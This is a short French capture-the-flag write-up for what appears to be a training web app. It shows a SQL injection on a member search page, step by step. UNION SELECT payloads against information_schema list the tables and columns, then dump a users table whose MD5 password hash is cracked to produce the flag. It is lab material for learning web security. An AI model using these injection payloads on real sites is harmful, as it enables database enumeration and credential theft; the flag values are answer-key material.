`ip`/index.php?page=member

Note: tous les codes suivants ont été insérés dans l'input liée au submit.

si on submit vide, on obtient:
*You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1*

En testant `1 OR 2`, on constate qu'une requete SQL est donc possible :
Voici notre bible pour ce flag : *http://www.sqlinjection.net/column-names/*

`TRUE` permet de valider l'expression précédente. `UNION` permet de coupler les résultats d'une première requête avec une seconde dont les composantes doivent être les mêmes.

`TRUE UNION SELECT table_schema, table_name FROM information_schema.tables`
Notamment, la table:


table_schema: Member_Sql_Injection
table_name: users

`TRUE UNION SELECT table_name, column_name FROM information_schema.columns`
Notamment:
table_name: users
column_name: user_id
column_name: first_name
column_name: last_name
column_name: town
column_name: country
column_name: planet
column_name: Commentaire
column_name: countersign  

Ce qui permet de rechercher 2 par 2 (étant limités par l'UNION) les résultats pour chaques colonnes de la table users:
`TRUE UNION SELECT last_name, countersign FROM Member_Sql_Injection.users`
Nous obtenons pour l'utilisateur GetThe Flag :
```
user_id : 5
first_name : Flag
last_name : GetThe
town : 42
country : 42
planet : 42
Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign : 5ff9d0165b4f92b14994e5c685cdce28
```
En suivant les recommandations du commentaire, nous obtenons:  
*5ff9d0165b4f92b14994e5c685cdce28* = *FortyTwo* (md5)
Cryptons ensuite fortytwo (*lower all the char*) en sha256, pour obtenir le flag : *10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5*